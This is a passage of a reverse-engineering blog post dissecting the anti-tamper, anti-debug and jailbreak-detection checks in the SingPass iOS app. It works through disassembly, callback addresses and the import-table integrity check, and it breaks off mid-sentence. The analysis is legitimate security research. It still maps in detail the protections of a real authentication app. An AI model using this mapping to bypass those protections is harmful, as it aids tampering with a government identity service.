#0x20 __text: 000000010000B06C B _objc_retain __text: 000000010000B010 MOV X20 , SP __text: 000000010000B014 ADRP X8 , #hook_detect_cbk_ptr @PAGE __text: 000000010000B018 LDR X8 , [ X8 , #hook_detect_cbk_ptr @PAGE ] __text: 000000010000B01C MOV X9 , SP __text: 000000010000B020 SUB X10 , X9 , #0x10 __text: 000000010000B024 MOV SP , X10 __text: 000000010000B028 MOV X11 , #0x13B86436775FA1D __text: 000000010000B038 STUR X11 , [ X9 , #-0x10 ] __text: 000000010000B03C MOV X9 , SP __text: 000000010000B040 SUB X0 , X9 , #0x10 __text: 000000010000B044 MOV SP , X0 __text: 000000010000B048 MOV W11 , #0x400 ---\u0026gt; EVT_CODE_PROLOGUE __text: 000000010000B04C STUR W11 , [ X9 , #-0x10 ] __text: 000000010000B050 STUR X10 , [ X9 , #-8 ] __text: 000000010000B054 BLR X8 Hook Detection Callback __text: 000000010000B058 MOV SP , X20 __text: 000000010000B000 ADRP X8 , #sub_10000AFC8 @PAGE __text: 000000010000B004 LDRB W8 , [ X8 , #sub_10000AFC8 @PAGEOFF ] __text: 000000010000B008 CMP W8 , #0xFF __text: 000000010000B00C B.EQ loc_f inish 0xFF 0x83 0x00 0xD1 SUB SP, SP, #0x20 To detect if a given function is hooked, the obfuscator loads the first byte of the function and compares this byte with the value 0xFF. 0xFF might seem \u0026ndash; at first glance \u0026ndash; arbitrary but it\u0026rsquo;s not. Actually, regular functions start with a prologue that allocates space on stack for saving registers defined by the calling convention and stack variables required by the function. In AArch64, this allocation can be performed in two ways:\nstp REG, REG, [SP, 0xAA]! ; or sub SP, SP, 0xBB stp REG, REG, [SP, 0xCC] These instructions are not equivalent, but somehow and with the good offsets, they could lead to the same result. In the second case, the instruction sub SP, SP, #CST is encoded with the following bytes:\n0xff ** 0x00 0xd1 As we can see, the encoding of this instruction starts with 0xFF. If it is not the case, then either the function starts with a different stack-allocation prologue or potentially starts with a hooking trampoline. Since the code of the application is compiled through obfuscator\u0026rsquo;s compiler, the compiler is able to distinguish these two cases and insert the right check for the correct function\u0026rsquo;s prologue.\nIf the first byte of the instruction of the function does not pass the check, it jumps to the red basic block. The purpose of this basic block is to trigger a user-defined callback that will process the detection according to the application\u0026rsquo;s design and the developers\u0026rsquo; choices:\nPrinting an error Crashing the application Corrupting internal data \u0026hellip; From the previous figure, we can observe that the detection callback is loaded from a static variable located at #hook_detect_cbk_ptr. When calling this detection callback, the obfuscator provides the following information to the callback:\nA detection code: 0x400 for EVT_CODE_PROLOGUE A corrupted pointer which could be used to crash the application. Let\u0026rsquo;s now take a closer look at the design of the detection callback(s) as a whole.\nDetection Callbacks As explained in the previous section, when the obfuscator detects tampering, it reacts by calling a detection callback stored in the static variable at the address: 0x10109D760\n\u003c?xml version=\"1.0\" ?\u003e __data:000000010109D758\u0026#160;off_10109D758\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;sub_100ED9F00 __data:000000010109D760\u0026#160;hook_detect_cbk_ptr\u0026#160;DCQ\u0026#160;hook_detect_cbk\u0026#160;;\u0026#160;Hook\u0026#160;Detection\u0026#160;Callback __data:000000010109D768\u0026#160;word_10109D768\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCW\u0026#160;0xDBE3 __data:000000010109D76A\u0026#160;byte_10109D76A\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCB\u0026#160;1 __data:000000010109D76B\u0026#160;byte_10109D76B\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCB\u0026#160;1 By statically analyzing hook_detect_cbk, the implementation seems to corrupt the pointer provided in the callback\u0026rsquo;s parameters. On the other hand, when running the application we observe a jailbreak detection message and not a crash of the application.\nIf we look at the cross-references which read or write at this address, we get this list of instructions:\n\u003c?xml version=\"1.0\" ?\u003e ... R\u0026#160;init_and_check_rasp+1D8C\u0026#160;\u0026#160;\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] R\u0026#160;init_and_check_rasp+1DE4\u0026#160;\u0026#160;\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] R\u0026#160;init_and_check_rasp+1E3C\u0026#160;\u0026#160;\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] R\u0026#160;init_and_check_rasp+1E94\u0026#160;\u0026#160;\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] R\u0026#160;init_and_check_rasp+1EEC\u0026#160;\u0026#160;\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] R\u0026#160;init_and_check_rasp+1F44\u0026#160;\u0026#160;\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] W\u0026#160;init_and_check_rasp+01BC\u0026#160;\u0026#160;\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] So actually only one instruction \u0026ndash; init_and_check_rasp+01BC \u0026ndash; is overwriting the default detection callback with another function:\n\u003c?xml version=\"1.0\" ?\u003e __text:0000000100ED7E4C\u0026#160;ADRP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;#sub_100206C68@PAGE __text:0000000100ED7E50\u0026#160;LDRB\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W8,\u0026#160;[X8,#sub_100206C68@PAGEOFF] __text:0000000100ED7E54\u0026#160;ADRL\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;hook_detect_cbk_user_def __text:0000000100ED7E5C\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X20,#hook_detect_cbk_ptr@PAGEOFF] __text:0000000100ED7E60\u0026#160;CMP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W8,\u0026#160;#0xFF __text:0000000100ED7E64\u0026#160;B.EQ\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;loc_100ED7EB0 Compared to the default callback: hook_detect_cbk, the overridden function, hook_detect_cbk_user_def does not corrupt a pointer that would make the application crash. Instead, it calls the function on_rasp_detection which references all the strings EVT_CODE_TRACING, EVT_CODE_SYSTEM_LIB, etc, listed in the figure 2.\n\u0026#160; hook_detect_cbk_user_def is called on a RASP event. That\u0026rsquo;s why this application does not crash. By looking at the function init_and_check_rasp as a whole, we can notice that the X23 register is also used to initialize other static variables:\n\u003c?xml version=\"1.0\" ?\u003e W\u0026#160;0x00100ED7E5C:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X20,\u0026#160;#hook_detect_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED81F0:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X25,\u0026#160;#EVT_CODE_TRACING_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED86A0:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X25,\u0026#160;#EVT_CODE_SYMBOL_TABLE_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED8B48:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X25,\u0026#160;#EVT_CODE_SYSTEM_LIB_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED8C64:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X24,\u0026#160;#EVT_ENV_JAILBREAK_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED8E40:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X24,\u0026#160;#EVT_APP_SIGNATURE_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED91D4:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X24,\u0026#160;#EVT_ENV_DEBUGGER_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED9408:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X24,\u0026#160;#EVT_APP_LOADED_LIBRARIES_cbk_ptr@PAGEOFF] W\u0026#160;0x00100ED9694:\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;X23,\u0026#160;[X24,\u0026#160;#EVT_APP_MACHO_cbk_ptr@PAGEOFF] Fig 3. X23 Writes Instructions These memory writes mean that the callback hook_detect_cbk_user_def is used to initialize other static variables. In particular, these other static variables are likely used for the other RASP checks. By looking at the cross-references of these static variables #EVT_CODE_TRACING_cbk_ptr, #EVT_ENV_JAILBREAK_cbk_ptr etc, we can locate where the other RASP checks are performed and under which conditions they are triggered.\nEVT_CODE_SYSTEM_LIB \u003c?xml version=\"1.0\" ?\u003e loc_libs_ok MOV X20 , SP ADRP X8 , #EVT_CODE_SYSTEM_LIB_cbk_ptr @PAGE LDR X8 , [ X8 , #EVT_CODE_SYSTEM_LIB_cbk_ptr @PAGEOFF ] MOV X9 , SP SUB X10 , X9 , #0x10 MOV SP , X10 STUR X28 , [ X9 , #-0x10 ] MOV X9 , SP SUB X0 , X9 , #0x10 MOV SP , X0 MOV W11 , #0x1000 ---\u0026gt; EVT_CODE_SYSTEM_LIB STUR W11 , [ X9 , #-0x10 ] STUR X10 , [ X9 , #-8 ] BLR X8 On suspicious system lib detected MOV SP , X20 loc_100EC946C ADR X0 , check_region_cbk BL iterate_system_region ORR W8 , W0 , W20 CBZ W8 , loc_libs_ok ios_module_security CoreFoundation NDIWrapper libswiftDispatch.dylib libAWDSupport.dylib EVT_ENV_DEBUGGER \u003c?xml version=\"1.0\" ?\u003e loc_not_debugged MOV X21 , SP MOV X8 , SP SUB X9 , X8 , #0x10 MOV SP , X9 MOV X10 , SP SUB X0 , X10 , #0x10 MOV SP , X0 STUR X9 , [ X10 , #-8 ] MOV W9 , #2 ---\u0026gt; EVT_ENV_DEBUGGER STUR W9 , [ X10 , #-0x10 ] MOV X9 , #0x13B76A15BC51C03 STP X27 , X9 , [ X8 , #-0x10 ] ADRP X8 , #EVT_ENV_DEBUGGER_cbk_ptr @PAGE LDR X8 , [ X8 , #EVT_ENV_DEBUGGER_cbk_ptr @PAGEOFF ] BLR X8 On Debugger Detected MOV SP , X21 MOV X16 , #SYS_getppid SVC 0x80 MOV X21 , X0 CMP X21 , #1 ; 1 --\u0026gt; /sbin/launchd -s B.EQ loc_not_debugged EVT_ENV_JAILBREAK \u003c?xml version=\"1.0\" ?\u003e loc_not_jailbroken MOV X25 , SP MOV X8 , #0x13B76B477E382CB MOV X9 , SP SUB X10 , X9 , #0x10 MOV SP , X10 MOV X11 , SP SUB X0 , X11 , #0x10 MOV SP , X0 STUR X10 , [ X11 , #-8 ] MOV W10 , #1 ---\u0026gt; EVT_ENV_JAILBREAK STUR W10 , [ X11 , #-0x10 ] STP X24 , X8 , [ X9 , #-0x10 ] ADRP X8 , #EVT_ENV_JAILBREAK_cbk_ptr @PAGE LDR X8 , [ X8 , #EVT_ENV_JAILBREAK_cbk_ptr @PAGEOFF ] BLR X8 On Jailbreak Detected MOV SP , X25 STLR WZR , [ X8 ] MOV W8 , #0x16 STP X9 , X8 , [ SP , #0x50 + var_60 ] ! MOV W0 , #SYS_pathconf BL _syscall ADD SP , SP , #0x10 CMP W0 , #1 , LSL #12 B.NE loc_not_jailbroken Thanks to the #EVT_* cross-references, we can go statically through all the basic blocks that use these #EVT_* variables and highlight the underlying checks that could trigger the RASP callback(s). Before detailing the checks, it is worth mentioning the following points:\nWhilst the application uses a commercial obfuscator which provides native code obfuscation in addition to RASP, the code is lightly obfuscated which makes static assembly code analysis doable very easily. As it will be discussed in \u0026quot;RASP Weaknesses\u0026quot;, the application setups the same callback for all the RASP events. Thus, it eases the RASP bypass and the dynamic analysis of the application. Anti-Debug The version of the obfuscator used by SingPass implements two kinds of debug check. First, it checks if the parent process id (ppid) is the same as /sbin/launchd which should be 1.\nstatic constexpr pid_t LAUNCHD_PID = 1; pid_t ppid = getppid(); if (ppid != LAUNCHD_PID) { // Trigger EVT_ENV_DEBUGGER } \u0026#160; getppid is called either through a function or with a syscall. If it is not the case, it triggers the EVT_ENV_DEBUGGER event. The second check is based on sysctl which is used to access the extern_proc.p_flag value. If this flag contains the P_TRACED value, the RASP routine triggers the EVT_ENV_DEBUGGER event.\nint names[] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid(), }; kinfo_proc info; int sizeof_info = sizeof(kinfo_proc); int ret = sysctl(names, 4, \u0026amp;info, \u0026amp;sizeof_info, nullptr, nullptr); if (info.kp_proc.p_flag \u0026amp; P_TRACED) { // Trigger EVT_ENV_DEBUGGER } In the SingPass binary, we can find an instance of these two checks in the following ranges of addresses:\nppid: 0x10071F420 \u0026ndash; 0x10071F474\nsysctl: 0x100151668 \u0026ndash; 0x100151730 Jailbreak Detection As for most of the jailbreak detections, the obfuscator tries to detect if the device is jailbroken by checking if some files exist (or not) on the device.\nFiles or directories are checked with syscalls or a regular functions thanks to the following helpers:\npathconf: 0x100008EB0 -- 0x100008F28 utimes: 0x10000D8D4 -- 0x10000D948 stat: 0x100012188 -- 0x10001221C open: 0x10002D478 -- 0x10002D4D8 fopen: 0x1000474E4 -- 0x100047554 stat64: 0x10006AA30 -- 0x10006AAD8 getfsstat64: 0x10047E82C -- 0x10047E914 While in the introduction, I mentioned that a dump of the section __data reveals strings related to jailbreak detection, the dump does not reveal all the strings used by the obfuscator.\nBy looking closely at the strings encoding mechanism, it turns out that some strings are decoded just-in-time in a temporary variable. I\u0026rsquo;ll explain the strings encoding mechanism in the second part of this series of blog posts but at this point, we can uncover the strings by setting hooks on functions like fopen, utimes and dumping the __data section right after these calls. Then, we can iterate over the different dumps to see if new strings appear.\n$ python dump_analysis.py Processing __data_0.raw 0x01010b935c h/.installed_unc0ver 0x01010b986a w/taurine/pspawn_payload.dylib Processing __data_392.raw 0x01010b910e y__TEXT 0x01010b91b3 /System/Library/dyld/dyld_shared_cache_arm64e 0x01010b9174 /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e 0x01010b9136 /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64 0x01010b9126 dyld_v1 arm64e 0x01010b9116 dyld_v1 arm64 Processing __data_393.raw 0x01010afb90 /Users/xxxxxxx/Desktop/Xcode/ndi-sp-mobile-ios-swift/SingPass/[...] 0x01010b942c /var/jb 0x01010af910 https://bio-stream.singpass.gov.sg 0x01010af6a0 https://api.myinfo.gov.sg/spm/v3 0x01010b93b0 /.mount_rw In the end, the approach does not enable to have all the strings decoded but it enables to have a good coverage. The list of the files used for detecting jailbreak is given the Annexes.\nThere is also a particular check for detecting the unc0ver jailbreak which consists in trying to unmount /.installed_unc0ver:\n0x100E4D814: _unmount(\u0026#34;/.installed_unc0ver\u0026#34;) Environment The obfuscator also checks environment variables that trigger the EVT_ENV_JAILBREAK event. Some of these checks seem to be related to code lifting detection while still triggering the EVT_ENV_JAILBREAK event.\nif (strncmp(_dyld_get_image_name(0), \u0026#34;/private/var/folders\u0026#34;, 0x14)) { -\u0026gt; Trigger EVT_ENV_JAILBREAK } if (strncmp(getenv(\u0026#34;HOME\u0026#34;), \u0026#34;/Users\u0026#34;, 6) == 0) { -\u0026gt; Trigger EVT_ENV_JAILBREAK } if (strncmp(getenv(\u0026#34;HOME\u0026#34;), \u0026#34;mobile\u0026#34;, 6) != 0) { -\u0026gt; Trigger EVT_ENV_JAILBREAK } char buffer[0x400]; size_t buff_size = 0x400; _NSGetExecutablePath(buffer, \u0026amp;buff_size); if (buffer.startswith(\u0026#34;/private/var/folders\u0026#34;)) { -\u0026gt; Trigger EVT_ENV_JAILBREAK } startswith() From a reverse engineering perspective, startswith() is actually implemented as a succession of xor that are \u0026ldquo;or-ed\u0026rdquo; to get a boolean. This might be the result of an optimization from the compiler. You can observe this pattern in the basic block located at the address: 0x100015684. Advanced Detections In addition to regular checks, the obfuscator performs advanced checks like verifying the current status of the SIP (System Integrity Protection), and more precisely, the KEXTS code signing status.\n\u0026#160; From my weak experience in iOS jailbreaking, I think that no Jailbreak disables the CSR_ALLOW_UNTRUSTED_KEXTS flag. Instead, I guess that it is used to detect if the application is running on an Apple M1 which allows such deactivation. csr_config_t buffer = 0; if (__csrctl(CSR_ALLOW_UNTRUSTED_KEXTS, buffer, sizeof(csr_config_t)) { /* * SIP is disabled with CSR_ALLOW_UNTRUSTED_KEXTS * -\u0026gt; Trigger EVT_ENV_JAILBREAK */ } \u0026#160; Assembly range: 0x100004640 \u0026ndash; 0x1000046B8 The obfuscator also uses the Sandbox API to verify if some paths exist:\nint ret = __mac_syscall(\u0026#34;Sandbox\u0026#34;, /* Sandbox Check */ 2, getpid(), \u0026#34;file-test-existence\u0026#34;, SANDBOX_FILTER_PATH, \u0026#34;/opt/homebrew/bin/brew\u0026#34;); The paths checked through this API are OSX-related directories, so I guess it is also used to verify that the current code has not been lifted on an Apple Silicon. Here is, for instance, a list of directories checked with the Sandbox API:\n/Applications/Xcode.app/Contents/MacOS/Xcode /System/iOSSupport/ /opt/homebrew/bin/brew /usr/local/bin/brew \u0026#160; Assembly range: 0x100ED7684 (function) In addition, it uses the Sandbox attribute file-read-metadata as an alternative to the stat() function.\n\u0026#160; Assembly range: 0x1000ECA5C \u0026ndash; 0x1000ECE54 The application uses the sandbox API through private syscalls to determine whether some jailbreak artifacts exists. This is very smart but I guess it\u0026rsquo;s not really compliant with the Apple policy.\nCode Symbol Table The purpose of this check is to verify that the addresses of the resolved imports point to the right library. In other words, this check verifies that the import table is not tampered with pointers that could be used to hook imported functions.\n\u0026#160; Initialization: part of sub_100E544E8 \u0026#160; Assembly range: 0x100016FC4 \u0026ndash; 0x100017024 During the RASP checks initialization (sub_100E544E8), the obfuscator manually resolves the imported functions. This manual resolution is performed by iterating over the symbols in the SingPass binary, checking the library that imports the symbol, accessing (in-memory) the __LINKEDIT segment of this library, parsing the exports trie, etc. This manual resolution fills a table that contains the absolute address of the resolved symbols.\nIn addition, the initialization routine setups \u0026ndash; what I called \u0026ndash; a metadata structure that follows this layout:\n\u003c?xml version=\"1.0\" ?\u003e __data:000000010109F0C8\u0026#160;nb_symbols\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCD\u0026#160;0x399 __data:000000010109F0C8 __data:000000010109F0D8\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;ALIGN\u0026#160;0x20 __data:000000010109F0E0\u0026#160;;\u0026#160;symbols_metadata_t\u0026#160;metadata __data:000000010109F0E0\u0026#160;metadata\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;symbols_index\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;symbols_index __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;origins\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;origins __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;resolved_la_syms __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;resolved_got_syms __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;macho_la_syms __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;macho_got_syms __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;stub_helper_start __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;stub_helper_end __data:000000010109F0E0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;field_unknown symbols_index is a kind of translation table that converts an index known by the obfuscator into an index in the __got or the __la_symbol_ptr section. The index\u0026rsquo;s origin (i.e __got or __la_symbol_ptr) is determined by the origins table which contains enum-like integers:\nenum SYM_ORIGINS : uint8_t { NONE = 0, LA_SYMBOL = 1, GOT = 2, }; The length of both tables: symbols_index and origins, is defined by the static variable nb_symbols which is set to 0x399. The metadata structure is followed by two pointers: resolved_la_syms and resolved_got_syms which point to the imports address table manually filled by the obfuscator.\n\u0026#160; There is a dedicated table for each section: __got and __la_symbol_ptr. Then, macho_la_syms points to the beginning of the __la_symbol_ptr section while macho_got_syms points to the __got section.\nFinally, stub_helper_start / stub_helper_end holds the memory range of the __stub_helper section. I\u0026rsquo;ll describe the purpose of these values later.\nAll the values of this metadata structure are set during the initialization which takes place in the function sub_100E544E8.\nIn different places of the SingPass binary, the obfuscator uses this metadata information to verify the integrity of the resolved import(s). It starts by accessing the symbols_index and the origins with a fixed value:\n\u003c?xml version=\"1.0\" ?\u003e __text:00100016FC4\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W26,\u0026#160;[X22,#0xCA8]\u0026#160;;\u0026#160;X22\u0026#160;-\u0026gt;\u0026#160;symbols_index __text:00100016FC8\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;[X19,#0x498] __text:00100016FCC\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;XZR,\u0026#160;XZR,\u0026#160;[X19,#0x20] __text:00100016FD0\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X22,\u0026#160;X23,\u0026#160;[X19,#0x58] __text:00100016FD4\u0026#160;LDP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;Q0,\u0026#160;Q1,\u0026#160;[X19,#0x30] __text:00100016FD8\u0026#160;STUR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;Q0,\u0026#160;[X19,#0x68] __text:00100016F54\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X25,\u0026#160;[X19,#0x488] __text:00100016F58\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X24,\u0026#160;[X19,#0x490] __text:00100016F5C\u0026#160;LDRB\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W21,\u0026#160;[X23,#0x32A]\u0026#160;;\u0026#160;X23\u0026#160;-\u0026gt;\u0026#160;origins\u0026#160;table __text:00100016F60\u0026#160;ADRL\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X0,\u0026#160;check_region_cbk\u0026#160;;\u0026#160;cbk __text:00100016F68\u0026#160;BL\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;iterate_system_region \u0026#160; Since the symbols_index table contains uint32_t values, #0xCA8 matches #0x32A (index for the origins table) when divided by sizeof(uint32_t): 0xCA8 = 0x32A * sizeof(uint32_t) In other words, we have the following operations:\nconst uint32_t sym_idx = metadata.symbols_index[0x32a]; const SYM_ORIGINS origin = metadata.origins[0x32a] Then, given the sym_idx value and depending on the origin of the symbol, the function accesses either the resolved __got table or the resolved __la_symbol_ptr table. This access is done with a helper function located at sub_100ED6CC0. It can be summed up with the following pseudo-code:\nuintptr_t* section_ptr = nullptr; uintptr_t* manually_resolved = nullptr; if (origin == /* 1 */ SYM_ORIGINS::LA_SYMBOL) { section_ptr = metadata.macho_la_syms; manually_resolved = metadata.resolved_la_syms; } else if (origin == /* 2 */ SYM_ORIGINS::GOT) { section_ptr = metadata.macho_got_syms; manually_resolved = metadata.resolved_got_syms; } The entries at the index sym_idx of section_ptr and manually_resolved are compared and if they don\u0026rsquo;t match, the event #EVT_CODE_SYMBOL_TABLE is triggered.\nActually, the comparison covers different cases. First, the obfuscator handles the case where the symbol at sym_idx is not yet resolved. In that case, 